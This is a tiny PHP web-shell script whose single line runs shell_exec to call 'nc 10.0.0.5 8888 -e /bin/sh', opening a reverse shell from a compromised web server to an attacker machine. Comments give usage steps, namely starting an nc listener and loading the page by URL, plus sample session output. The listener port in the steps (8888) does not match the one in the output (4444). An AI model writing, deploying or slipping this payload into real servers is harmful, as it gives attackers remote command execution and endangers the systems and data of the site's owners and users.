<?php
// Requiremnet nc installed on web server
// To start listener on attacker machine
// nc -lvp 8888
// on URL type http://exaple.com/nc_rshell.php
//listening on [any] 4444 ...
//connect to [10.0.0.5] from [10.0.0.3] 36810
//ls
// test.txt
shell_exec('nc 10.0.0.5 8888 -e /bin/sh');
?>
